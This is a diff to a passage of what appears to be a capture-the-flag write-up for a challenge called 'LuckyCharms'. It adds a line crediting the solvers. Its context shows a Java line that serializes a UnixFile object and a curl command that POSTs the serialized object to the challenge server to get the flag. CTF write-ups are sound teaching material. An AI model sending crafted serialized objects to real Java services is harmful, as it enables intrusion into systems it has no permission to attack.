@@ -108,6 +108,8 @@ new ObjectOutputStream(System.out).writeObject(unixFile);
 ```
 We'll store the output in a file and use `curl` to pass the `UnixFile` object over a `POST` request, which yields the flag. 
 
+This challenge was solved by kree and paierlep. 
+
 ```
 curl 'http://146.148.10.175:1033/LuckyCharms' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Connection: keep-alive' --compressed -X POST --data-binary @object_serialized
 ```
